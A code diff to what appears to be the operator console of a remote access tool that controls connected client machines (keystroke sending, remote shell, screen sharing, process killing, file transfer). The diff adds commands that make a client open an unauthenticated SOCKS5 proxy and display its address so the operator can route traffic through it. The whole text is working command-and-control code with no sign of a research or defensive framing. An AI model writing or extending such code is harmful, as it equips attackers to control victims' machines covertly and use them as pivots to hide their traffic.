@@ -33,7 +33,8 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
         "back", "help", "clear", "kill", "exit", "screenshot", "sysinfo", "netinfo", 
         "list_processes", "search_process", "terminate_process", "send_keys", 
         "system_logs", "installed_software", "launch_app", "shell", 
-        "start_screen_share", "stop_screen_share", "upload_file", "download_file"
+        "start_screen_share", "stop_screen_share", "upload_file", "download_file",
+        "start_proxy", "stop_proxy", "proxy_status"
     ]
     
     # Function to check if a command is valid
@@ -227,6 +228,100 @@ def client_command_mode(active_client, client_sockets, server_running, print_ban
                     client_sockets[active_client].settimeout(None)
                 except Exception as e:
                     print(f"{Fore.RED}Error stopping screen sharing: {str(e)}{Style.RESET_ALL}")
+                    active_client = handle_client_disconnect_wrapper_local(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
+            
+            elif command.lower().startswith("start_proxy"):
+                try:
+                    client_sockets[active_client].send(command.encode())
+                    print(f"{Fore.CYAN}Starting SOCKS5 proxy on client {active_client}...{Style.RESET_ALL}")
+                    
+                    # Wait for confirmation from client
+                    client_sockets[active_client].settimeout(10.0)
+                    try:
+                        response = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
+                        if "successfully" in response.lower():
+                            print(f"{Fore.GREEN}✓ SOCKS5 Proxy Status:{Style.RESET_ALL}")
+                            print(f"{Fore.WHITE}{response}{Style.RESET_ALL}")
+                            
+                            # Extract port information for easy reference
+                            if "port" in response.lower():
+                                lines = response.split('\n')
+                                for line in lines:
+                                    if "proxy address:" in line.lower():
+                                        proxy_addr = line.split(': ')[-1].strip()
+                                        print(f"\n{Fore.CYAN}╔{'═' * 60}╗{Style.RESET_ALL}")
+                                        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.WHITE}Configure your applications to use SOCKS5 proxy:{Style.RESET_ALL}{' ' * 8} {Fore.CYAN}║{Style.RESET_ALL}")
+                                        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{proxy_addr}{' ' * (57 - len(proxy_addr))}{Fore.CYAN}║{Style.RESET_ALL}")
+                                        print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}No authentication required{Style.RESET_ALL}{' ' * 33} {Fore.CYAN}║{Style.RESET_ALL}")
+                                        print(f"{Fore.CYAN}╚{'═' * 60}╝{Style.RESET_ALL}")
+                                        break
+                        else:
+                            print(f"{Fore.RED}Failed to start SOCKS5 proxy: {response}{Style.RESET_ALL}")
+                    except socket.timeout:
+                        print(f"{Fore.RED}Timeout waiting for proxy response{Style.RESET_ALL}")
+                    
+                    client_sockets[active_client].settimeout(None)
+                except Exception as e:
+                    print(f"{Fore.RED}Error starting SOCKS5 proxy: {str(e)}{Style.RESET_ALL}")
+                    active_client = handle_client_disconnect_wrapper_local(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
+            
+            elif command.lower() == "stop_proxy":
+                try:
+                    client_sockets[active_client].send("stop_proxy".encode())
+                    print(f"{Fore.CYAN}Stopping SOCKS5 proxy on client {active_client}...{Style.RESET_ALL}")
+                    
+                    # Wait for confirmation from client
+                    client_sockets[active_client].settimeout(5.0)
+                    try:
+                        response = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
+                        if "successfully" in response.lower():
+                            print(f"{Fore.GREEN}✓ {response}{Style.RESET_ALL}")
+                        else:
+                            print(f"{Fore.YELLOW}Response: {response}{Style.RESET_ALL}")
+                    except socket.timeout:
+                        print(f"{Fore.YELLOW}No response from client (proxy may already be stopped){Style.RESET_ALL}")
+                    
+                    client_sockets[active_client].settimeout(None)
+                except Exception as e:
+                    print(f"{Fore.RED}Error stopping SOCKS5 proxy: {str(e)}{Style.RESET_ALL}")
+                    active_client = handle_client_disconnect_wrapper_local(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
+            
+            elif command.lower() == "proxy_status":
+                try:
+                    client_sockets[active_client].send("proxy_status".encode())
+                    print(f"{Fore.CYAN}Getting SOCKS5 proxy status from client {active_client}...{Style.RESET_ALL}")
+                    
+                    # Wait for status response from client
+                    client_sockets[active_client].settimeout(5.0)
+                    try:
+                        response = client_sockets[active_client].recv(buffer_size).decode('utf-8', errors='replace')
+                        print(f"{Fore.GREEN}SOCKS5 Proxy Status:{Style.RESET_ALL}")
+                        print(f"{Fore.WHITE}{response}{Style.RESET_ALL}")
+                        
+                        # If proxy is running, show configuration box
+                        if "running" in response.lower() and "port" in response.lower():
+                            lines = response.split('\n')
+                            for line in lines:
+                                if "proxy address:" in line.lower():
+                                    proxy_addr = line.split(': ')[-1].strip()
+                                    print(f"\n{Fore.CYAN}╔{'═' * 50}╗{Style.RESET_ALL}")
+                                    print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.WHITE}SOCKS5 Proxy Configuration:{Style.RESET_ALL}{' ' * 19} {Fore.CYAN}║{Style.RESET_ALL}")
+                                    print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.GREEN}{proxy_addr}{' ' * (47 - len(proxy_addr))}{Fore.CYAN}║{Style.RESET_ALL}")
+                                    print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}No authentication required{Style.RESET_ALL}{' ' * 23} {Fore.CYAN}║{Style.RESET_ALL}")
+                                    print(f"{Fore.CYAN}╚{'═' * 50}╝{Style.RESET_ALL}")
+                                    break
+                    except socket.timeout:
+                        print(f"{Fore.RED}Timeout waiting for proxy status{Style.RESET_ALL}")
+                    
+                    client_sockets[active_client].settimeout(None)
+                except Exception as e:
+                    print(f"{Fore.RED}Error getting SOCKS5 proxy status: {str(e)}{Style.RESET_ALL}")
                     active_client = handle_client_disconnect_wrapper_local(active_client)
                     input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
                     break
